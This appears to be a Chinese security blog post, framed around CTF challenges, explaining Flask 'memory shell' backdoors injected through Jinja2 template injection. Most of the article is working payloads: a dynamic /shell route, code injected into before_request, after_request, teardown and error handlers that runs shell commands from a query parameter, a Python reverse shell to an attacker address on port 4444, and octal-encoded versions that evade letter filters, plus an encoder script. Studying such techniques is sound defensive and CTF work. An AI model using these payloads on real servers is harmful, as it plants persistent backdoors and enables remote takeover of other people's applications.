@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - flask内存马</title>
+        <meta name="description" content="最近遇到一些flask ssti模板注入的题目，在既没有回显，又不能出网的情况下，内存马成了一个好的选择。 在flask中，没有定义的路由会返回404的，因此内存马最初是通过动态注册路由来实现的，新版的flask已经不允许动态注册路由了，现在也有一些新的姿势实现 低版本flask内存马 分析低版本payload {{u…">
+    <link rel="canonical" href="https://the0n3.top/pages/77dbc1/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="flask内存马">
+    <meta property="og:description" content="最近遇到一些flask ssti模板注入的题目，在既没有回显，又不能出网的情况下，内存马成了一个好的选择。 在flask中，没有定义的路由会返回404的，因此内存马最初是通过动态注册路由来实现的，新版的flask已经不允许动态注册路由了，现在也有一些新的姿势实现 低版本flask内存马 分析低版本payload {{u…">
+    <meta property="og:url" content="https://the0n3.top/pages/77dbc1/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/flask-shell/0.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="flask内存马">
+    <meta name="twitter:description" content="最近遇到一些flask ssti模板注入的题目，在既没有回显，又不能出网的情况下，内存马成了一个好的选择。 在flask中，没有定义的路由会返回404的，因此内存马最初是通过动态注册路由来实现的，新版的flask已经不允许动态注册路由了，现在也有一些新的姿势实现 低版本flask内存马 分析低版本payload {{u…">
+        <meta name="twitter:image" content="https://the0n3.top/images/flask-shell/0.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>flask内存马</h1>
+    <p>
+        <span class="meta">发布于: 2024-10-23 13:56</span>
+    </p>
+    <div class="post-body">
+        <p>最近遇到一些flask ssti模板注入的题目，在既没有回显，又不能出网的情况下，内存马成了一个好的选择。</p>
+<p>在flask中，没有定义的路由会返回404的，因此内存马最初是通过动态注册路由来实现的，新版的flask已经不允许动态注册路由了，现在也有一些新的姿势实现</p>
+<p><img src="/images/flask-shell/0.png" alt="0" decoding="async" width="1831" height="566"></p>
+<h2>低版本flask内存马</h2>
+<p>分析低版本payload</p>
+<pre><code class="language-python">{{url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})}}</code></pre>
+<p>这里使用了flask的内置函数<code>url_for</code>，通过<code>url_for.__globals__</code>获取到全局变量，然后通过<code>__builtins__</code>获取到内置函数<code>eval</code>，在eval函数里使用<code>add_url_rule</code>动态的创建了一个<code>/shell</code>的路由，在这个路由下通过定义匿名函数导入了<code>os</code>模块，然后执行了<code>os.popen</code>函数，接收一个<code>cmd</code>参数，默认值为<code>whoami</code>，最后返回执行结果。</p>
+<p>格式化成易读的形式</p>
+<pre><code class="language-python">url_for.__globals__['__builtins__']['eval'](
+    "app.add_url_rule(
+        '/shell', 
+        'shell', 
+        lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()
+        )
+    ",
+    {
+        '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],
+        'app':url_for.__globals__['current_app']
+    })</code></pre>
+<p>eval函数里的第二个参数是一个字典， 给eval 函数提供一个自定义的全局命名空间</p>
+<ul>
+<li><code>_request_ctx_stack</code>：使eval函数可以获取flask请求的参数，状态</li>
+<li><code>app</code>：使eval函数可以调用应用的功能，比如注册路由、访问配置，这里用来调用 add_url_rule 方法，以动态添加新的路由</li>
+</ul>
+<p>后文多次需要引入<code>url_for.__globals__</code>的变量<code>request</code>、<code>app</code>，在需要传参利用时很重要，否则在匿名函数收不到参数</p>
+<p>部分flask版本下无法使用url_for.<strong>globals</strong>['current_app']来获取app，可以sys.modules，通过<code>url_for.__globals__['sys'].modules['__main__'].__dict__['app']</code>来获取app</p>
+<p><img src="/images/flask-shell/1.png" alt="1" decoding="async" loading="lazy" width="786" height="703"></p>
+<p>低版本flask复现环境(windows)</p>
+<p>演示的flask环境</p>
+<pre><code class="language-plaintext">pip install Flask==1.1.1 itsdangerous==1.1.0 Jinja2==2.11.3 MarkupSafe==1.1.1 Werkzeug==1.0.1</code></pre>
+<pre><code class="language-python">from flask import Flask,request,render_template_string
+app = Flask(__name__)
+
+@app.route('/',methods=['GET','POST'])
+def home():
+    return render_template_string(request.args.get('name','hello,world!'))
+
+if __name__ == '__main__':
+    app.run()</code></pre>
+<p>成功打入内存马</p>
+<p><img src="/images/flask-shell/3.png" alt="3" decoding="async" loading="lazy" width="1612" height="701"></p>
+<p><img src="/images/flask-shell/4.png" alt="4" decoding="async" loading="lazy" width="1008" height="705"></p>
+<p>尝试在linux环境下复现时鸡飞狗跳，没有配好就不掩饰了</p>
+<h2>新版内存马</h2>
+<p>flask常用的装饰器<code>route</code>、<code>before_request</code>、<code>after_request</code>、<code>errorhandler</code>、<code>login_required</code></p>
+<p>在禁止动态注册路由的情况下，可以使用flask的特殊装饰器<code>before_request</code>、<code>after_request</code>、<code>errorhandler</code>处理特定的请求方法，在每次请求之前执行代码，从而实现内存马的效果</p>
+<h3>before_request</h3>
+<p>跟着去<code>before_request</code>装饰器源码里看定义</p>
+<p><img src="/images/flask-shell/5.png" alt="5" decoding="async" loading="lazy" width="1534" height="989"></p>
+<pre><code class="language-python">    @setupmethod
+    def before_request(self, f: BeforeRequestCallable) -&gt; BeforeRequestCallable:
+        """
+        在每次请求之前，调用自定义的函数f
+        """
+        self.before_request_funcs.setdefault(None, []).append(f)
+        return f</code></pre>
+<p>在这里，如果 None 键不存在，就初始化为一个空列表。如果存在传入的函数 f，则通过调用<code>before_request_funcs.setdefault(None, []).append(f)</code>函数把自定义函数f添加到before_request_funcs 字典中，在每次请求处理之前调用这个函数</p>
+<p>重点：通过调用<code>before_request_funcs.setdefault(None, []).append(f)</code>函数添加了自定义函数</p>
+<p>如果可以打入自定义的后门函数，那么每次请求前都会触发来执行命令</p>
+<pre><code class="language-python">lambda :__import__('os').popen('whoami').read()</code></pre>
+<p>内存马payload</p>
+<pre><code class="language-python">{{url_for.__globals__.__builtins__['eval']("sys.modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen(__import__('flask').request.args.get('a')).read())")}}&amp;a=whoami</code></pre>
+<p>通过动态导入 sys 模块，获取当前 Flask 应用实例 app，并将一个匿名函数添加到 app 的请求前处理函数列表中，利用<code>before_request</code>装饰器触发自定义后门函数执行命令</p>
+<p><img src="/images/flask-shell/6.png" alt="6" decoding="async" loading="lazy" width="1465" height="592"></p>
+<h3>after_request</h3>
+<p>after_request：如果处理逻辑没有异常抛出，在每次请求后运行</p>
+<p><code>after_request</code>装饰器在每次请求处理之后调用，同样可以接收一个自定义函数f，区别在，这里的函数需要接收一个response对象，同时返回一个response对象</p>
+<p>定义</p>
+<pre><code class="language-python">@setupmethod
+    def after_request(self, f: AfterRequestCallable) -&gt; AfterRequestCallable:
+        """注册一个函数，在每次请求后运行。
+
+        该函数会接收响应对象，并必须返回一个响应对象。这允许函数在发送响应之前修改或替换响应。
+
+        如果一个函数引发异常，则任何剩余的 ``after_request`` 函数将不会被调用。因此，这不应用于必须执行的操作，例如关闭资源。请使用 :meth:`teardown_request` 来处理此类操作。
+        """
+        self.after_request_funcs.setdefault(None, []).append(f)
+        return f</code></pre>
+<p>仅通过lambda无法对原始传进来的response进行修改后再返回，所以需要重新生成一个response对象，然后再返回这个response</p>
+<p>函数内容为：</p>
+<pre><code class="language-python">lambda resp: #传入参数
+    CmdResp if request.args.get('cmd') and      #如果请求参数含有cmd则返回命令执行结果
+    exec('
+        global CmdResp;     #定义一个全局变量，方便获取
+        CmdResp=make_response(os.popen(request.args.get(\'cmd\')).read())   #创建一个响应对象
+    ')==None    #exec函数返回None，所以恒真
+    else resp)  #如果请求参数没有cmd则正常返回
+#这里的cmd参数名和CmdResp变量名都是可以改的，最好改成服务中不存在的变量名以免影响正常业务</code></pre>
+<ul>
+<li>
+<p>在 <code>before_request</code> 中，<code>request</code> 和 <code>app</code> 是在请求上下文中自动可用的。这是因为 <code>before_request</code> 钩子在处理请求时就会被调用，此时 Flask 已经设置好了请求上下文。因此，可以直接使用<code>request</code>和<code>app</code> </p>
+</li>
+<li>
+<p><code>after_request</code> 的上下文是在响应生成后，需要显式传递<code>request</code>和<code>app</code>这些变量来确保它们在函数中可用。这样，before_request 和 after_request 的行为差异源于它们被调用的上下文和时间</p>
+</li>
+</ul>
+<p>在这里可以知道，<code>after_request</code>需要显示手动导入<code>request</code>和<code>app</code>变量这些<code>{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']}</code></p>
+<p>payload：</p>
+<pre><code class="language-python">{{url_for.__globals__.__builtins__['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}&amp;cmd=whoami</code></pre>
+<h3>teardown_request</h3>
+<p>teardown_request：在每次请求后运行，即使处理发生了错误</p>
+<p>定义：</p>
+<pre><code class="language-python">@setupmethod
+    def teardown_request(self, f: TeardownCallable) -&gt; TeardownCallable:
+        self.teardown_request_funcs.setdefault(None, []).append(f)
+        return f</code></pre>
+<p>与<code>after_request</code>类似，<code>teardown_request</code>装饰器在每次请求处理之后调用，同样可以接收一个自定义函数f，在后台运行，没有回显，可以写文件，出网反弹shell</p>
+<pre><code class="language-python">{{url_for.__globals__.__builtins__['eval']("sys.modules['__main__'].__dict__['app'].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__('os').popen(__import__('flask').request.args.get('cmd')).read())")}}&amp;cmd=echo 11111 &gt; 1.txt</code></pre>
+<h3>teardown_appcontext</h3>
+<p>teardown_appcontext：在每次请求后运行，即使处理发生了错误</p>
+<p>定义：</p>
+<pre><code class="language-python">@setupmethod
+    def teardown_appcontext(self, f: TeardownCallable) -&gt; TeardownCallable:
+        self.teardown_appcontext_funcs.append(f)
+        return f</code></pre>
+<p>不能动态接收get参数，可以利用写文件，出网反弹shell</p>
+<p>payload：</p>
+<pre><code class="language-python">{{url_for.__globals__.__builtins__['eval']("sys.modules['__main__'].__dict__['app'].teardown_appcontext_funcs.append(lambda error: __import__('os').popen('echo 2222 &gt; 1.txt').read())")}}</code></pre>
+<h3>errorhandler</h3>
+<p>errorhandler：处理指定的异常</p>
+<p><code>errorhandler</code>装饰器用于处理指定的异常，可以接收一个异常类型或HTTP状态码作为参数，并返回一个处理函数。这个处理函数会在发生指定异常或HTTP状态码时被调用，HTTP状态码例如<code>200</code>、<code>400</code>、<code>403</code>、<code>404</code>、<code>500</code>，errorhandler可以定义这些状态码的回显</p>
+<p>如果定义<code>404</code>页面的回显，那么随便访问未定义/不存在的路由都会触发这个回显</p>
+<p>定义：</p>
+<pre><code class="language-python">@setupmethod
+    def errorhandler(
+        self, code_or_exception: t.Union[t.Type[Exception], int]
+    ) -&gt; t.Callable[["ErrorHandlerCallable"], "ErrorHandlerCallable"]:
+        """注册一个函数以处理按代码或异常类的错误。
+
+        一个装饰器，用于注册给定错误代码的函数。例如：
+
+            @app.errorhandler(404)
+            def page_not_found(error):
+                return '此页面不存在', 404
+
+        你也可以注册任意异常的处理程序：
+
+            @app.errorhandler(DatabaseError)
+            def special_exception_handler(error):
+                return '数据库连接失败', 500
+        """
+        def decorator(f: "ErrorHandlerCallable") -&gt; "ErrorHandlerCallable":
+            self.register_error_handler(code_or_exception, f)
+            return f
+
+        return decorator</code></pre>
+<p>跟进<code>register_error_handler</code>函数：</p>
+<pre><code class="language-python">    def register_error_handler(
+        self,
+        code_or_exception: t.Union[t.Type[Exception], int],
+        f: "ErrorHandlerCallable",
+    ) -&gt; None:
+        if isinstance(code_or_exception, HTTPException):  # old broken behavior
+            raise ValueError(
+                "Tried to register a handler for an exception instance"
+                f" {code_or_exception!r}. Handlers can only be"
+                " registered for exception classes or HTTP error codes."
+            )
+
+        try:
+            exc_class, code = self._get_exc_class_and_code(code_or_exception)
+        except KeyError:
+            raise KeyError(
+                f"'{code_or_exception}' is not a recognized HTTP error"
+                " code. Use a subclass of HTTPException with that code"
+                " instead."
+            ) from None
+
+        self.error_handler_spec[None][code][exc_class] = f</code></pre>
+<p>在最后的代码，code即是前面传来的错误码，exc_class是异常类，f是页面回显内容。通过exec函数执行命令，把结果赋值给f回显到错误页面</p>
+<pre><code class="language-python">exc_class, code = self._get_exc_class_and_code(code_or_exception)
+self.error_handler_spec[None][code][exc_class] = f</code></pre>
+<p>payload：</p>
+<pre><code class="language-python">{{ url_for.__globals__.__builtins__.exec("global exc_class; global code; exc_class, code = app._get_exc_class_and_code(404); app.error_handler_spec[None][code][exc_class] = lambda a: __import__('os').popen(request.args.get('cmd')).read()",{'request': url_for.__globals__['request'],'app': url_for.__globals__['current_app']})}}</code></pre>
+<h2>补充</h2>
+<p>突然发现很多人在看，补充一下最近学到的姿势：无字母打入内存马</p>
+<p>需要知道：</p>
+<ul>
+<li>flask可以使用<code>['']</code>替换<code>.</code>，来访问对象属性，例如：<code>''.__class__</code>,<code>''['__class__']</code></li>
+<li>flask可以解析引号里的进制，例如十六进制，八进制，十进制</li>
+<li>flask可以使用<code>__import__</code>来导入模块，例如：<code>__import__('os')</code></li>
+</ul>
+<p>利用<code>[]</code>中括号索引的引号，同时利用八进制数字绕过字母限制，可以达到无字母打入内存马的效果</p>
+<p>尝试解析</p>
+<p><img src="/images/flask-shell/7.png" alt="7" decoding="async" loading="lazy" width="1117" height="485"></p>
+<p>通过转换进制后的<code>''['__class__']['__base__']['__subclasses__']()</code>寻找可以子类<code>os_wrap</code></p>
+<p><img src="/images/flask-shell/8.png" alt="8" decoding="async" loading="lazy" width="1814" height="557"></p>
+<p>注意下面payload使用过程，需要换成实际索引，例如<code>os_wrap</code>的索引为<code>137</code></p>
+<h3>无字母反弹shell</h3>
+<p>使用<code>python3</code>反弹shell，反弹到攻击机的<code>192.168.237.1</code>，端口<code>4444</code>，注意<code>os.wrap类</code>索引修改为实际索引，例如<code>os_wrap</code>的索引为<code>137</code></p>
+<p>原payload</p>
+<pre><code class="language-python">''['__class__']['__base__']['__subclasses__']()[137]['__init__']['__globals__']['popen']('python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("192.168.237.1",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\'')['read']()</code></pre>
+<p>八进制</p>
+<pre><code class="language-python">''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\137\137']['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[137]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\160\157\160\145\156']('\160\171\164\150\157\1563 -\143 \'\151\155\160\157\162\164 \157\163,\160\164\171,\163\157\143\153\145\164;\163=\163\157\143\153\145\164.\163\157\143\153\145\164();\163.\143\157\156\156\145\143\164(("192.168.237.1",4444));[\157\163.\144\165\1602(\163.\146\151\154\145\156\157(),\146)\146\157\162 \146 \151\156(0,1,2)];\160\164\171.\163\160\141\167\156("\163\150")\'')['\162\145\141\144']()</code></pre>
+<h3>无字母打入内存马</h3>
+<p>使用<code>os.wrap</code>的内置函数<code>exec</code>打入内存马</p>
+<p>原payload</p>
+<pre><code class="language-python">''['__class__']['__base__']['__subclasses__']()[137]['__init__']['__globals__']['__builtins__']['exec']("sys.modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen(__import__('flask').request.args.get('a')).read())")</code></pre>
+<p>八进制</p>
+<pre><code class="language-python">''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\137\137']['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[137]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\170\145\143']("\163\171\163.\155\157\144\165\154\145\163['\137\137\155\141\151\156\137\137'].\137\137\144\151\143\164\137\137['\141\160\160'].\142\145\146\157\162\145\137\162\145\161\165\145\163\164\137\146\165\156\143\163.\163\145\164\144\145\146\141\165\154\164(\116\157\156\145, []).\141\160\160\145\156\144(\154\141\155\142\144\141: \137\137\151\155\160\157\162\164\137\137('\157\163').\160\157\160\145\156(\137\137\151\155\160\157\162\164\137\137('\146\154\141\163\153').\162\145\161\165\145\163\164.\141\162\147\163.\147\145\164('\141')).\162\145\141\144())")</code></pre>
+<p>一个不够完善的脚本，仅供参考</p>
+<pre><code class="language-python"># 使用python环境执行命令反弹shell  
+# payload = """''['__class__']['__base__']['__subclasses__']()[137]['__init__']['__globals__']['popen']('python3 -c \\'import os,pty,socket;s=socket.socket();s.connect(("192.168.237.1",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\\'')['read']()""" 
+# 内置函数exec打入内存马
+payload = """''['__class__']['__base__']['__subclasses__']()[137]['__init__']['__globals__']['__builtins__']['exec']("sys.modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen(__import__('flask').request.args.get('a')).read())")"""
+
+payload8 = ''
+
+def convert_char(char):
+    """
+    只将字母和下划线转换为八进制，数字和符号保持不变。
+    如果字符是反斜杠（\\），则保留原样。
+    """
+    if char == '\\':  # 如果字符是反斜杠，直接返回原样
+        return char
+    elif char.isalpha() or char == '_':  # 只对字母和下划线转换为八进制
+        return '\\' + format(ord(char), '03o')
+    else:  # 数字和符号保持不变
+        return char
+
+for char in payload:
+    payload8 += convert_char(char)
+
+print(f"原始payload：  {payload}")
+print(f"构造的payload8：   {payload8}")
+
+
+# ''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\137\137']['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[137]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\160\157\160\145\156']('\160\171\164\150\157\156\063 -\143 '\151\155\160\157\162\164 \157\163,\160\164\171,\163\157\143\153\145\164;\163=\163\157\143\153\145\164.\163\157\143\153\145\164();\163.\143\157\156\156\145\143\164(("192.168.237.1",4444));[\157\163.\144\165\160\062(\163.\146\151\154\145\156\157(),\146)\146\157\162 \146 \151\156(\060,\061,\062)];\160\164\171.\163\160\141\167\156("\163\150")'')['\162\145\141\144']()
+# 命令执行版本
+# 1['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[137]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\160\157\160\145\156']('\154\163')['\162\145\141\144']()
+# 测试可利用索引
+# ()['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[137]
+
+# 八进制打入内存马版本
+# ''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\137\137']['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[137]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\170\145\143']("\163\171\163.\155\157\144\165\154\145\163['\137\137\155\141\151\156\137\137'].\137\137\144\151\143\164\137\137['\141\160\160'].\142\145\146\157\162\145\137\162\145\161\165\145\163\164\137\146\165\156\143\163.\163\145\164\144\145\146\141\165\154\164(\116\157\156\145, []).\141\160\160\145\156\144(\154\141\155\142\144\141: \137\137\151\155\160\157\162\164\137\137('\157\163').\160\157\160\145\156(\137\137\151\155\160\157\162\164\137\137('\146\154\141\163\153').\162\145\161\165\145\163\164.\141\162\147\163.\147\145\164('\141')).\162\145\141\144())")
+
+# 反弹shell
+# python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.237.1",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+# ''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\137\137']['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[132]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\160\157\160\145\156']('\160\171\164\150\157\156 -\143 \'\151\155\160\157\162\164 \157\163,\160\164\171,\163\157\143\153\145\164;\163=\163\157\143\153\145\164.\163\157\143\153\145\164();\163.\143\157\156\156\145\143\164(("\061\071\062.\061\066\070.\062\063\067.\061",\064\064\064\064));[\157\163.\144\165\160\062(\163.\146\151\154\145\156\157(),\146)\146\157\162 \146 \151\156(\060,\061,\062)];\160\164\171.\163\160\141\167\156("\163\150")\'')['\162\145\141\144']()</code></pre>
+<p>参考：</p>
+<ul>
+<li><a href="https://baozongwi.xyz/2024/09/02/%E6%B5%85%E6%9E%90flask%E5%86%85%E5%AD%98%E9%A9%AC/#0x01-%E5%89%8D%E8%A8%80">浅析flask内存马</a></li>
+<li><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">新版FLASK下python内存马的研究</a></li>
+<li><a href="https://badboy.plus/2024/08/16/python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">python-Flask内存马</a></li>
+<li><a href="https://xz.aliyun.com/t/14421?time__1311=GqAxuWemqeq05DK5qCqiKP0IKPI5WOT4D">Python Flask内存马的另辟途径</a></li>
+<li><a href="http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">浅析Python Flask内存马</a></li>
+<li><a href="https://www.51cto.com/article/788099.html">Flask中四个好用的装饰器</a></li>
+<li><a href="https://blog.csdn.net/weixin_41777118/article/details/131970557">flask中的常用装饰器</a></li>
+<li><a href="https://blog.csdn.net/zhangvalue/article/details/93740580">Python Flask常见的请求钩子函数</a></li>
+<li><a href="https://badboy.plus/2024/08/16/python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">python-Flask内存马</a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>web</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#flask</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
